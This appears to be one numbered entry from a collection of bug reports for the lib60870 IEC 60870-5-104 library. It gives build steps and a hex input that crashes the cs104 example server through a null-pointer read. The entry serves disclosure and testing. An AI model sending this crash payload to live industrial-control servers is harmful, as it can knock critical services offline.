@@ -1,0 +1,17 @@
+Number: 55
+
+Summarize:
+The report tests the latest source code from /mz-automation/lib60870/ and triggers a crash while running the lib60870-C/examples/cs104_server/simple_server example with the provided input sequence. The observed failure is an AddressSanitizer-reported SEGV caused by a READ on address 0x000000000008 in CS101_ASDU_getCOT at src/iec60870/cs101/cs101_asdu.c:308:47, reached from handleASDU and handleMessage in src/iec60870/cs104/cs104_slave.c. The demonstrated impact is process termination with AddressSanitizer reporting DEADLYSIGNAL and ABORTING.
+
+Reproduce:
+1. Obtain the latest source code from /mz-automation/lib60870/.
+2. Compile it with clang and AddressSanitizer. Before make, set:
+   export CFLAGS="-g -fsanitize=address"
+   export LDFLAGS="-fsanitize=address"
+3. Build the project and run the example program lib60870-C/examples/cs104_server/simple_server.
+4. Provide the following input data to the running example:
+   681a 0f00 0000 0000 0000 0000 0000 0000 0083 00fa 0000 0083 00fa 00e2 6809 0000 0000 0083 00fa 00e2 eb00 8000 0000 0000 0100 0083 0004 83f0
+5. Expected result: AddressSanitizer reports "SEGV on unknown address 0x000000000008", says the signal is caused by a READ memory access, shows the top frame in CS101_ASDU_getCOT (/root/temp/iec/lib60870/lib60870-C/src/iec60870/cs101/cs101_asdu.c:308:47), and ends with ABORTING.
+
+Payload:
+68 1a 0f 00 00 00 00 00 00 00 00 00 00 00 00 00 00 83 00 fa 00 00 00 83 00 fa 00 e2 68 09 00 00 00 00 00 83 00 fa 00 e2 eb 00 80 00 00 00 00 00 01 00 00 83 00 04 83 f0
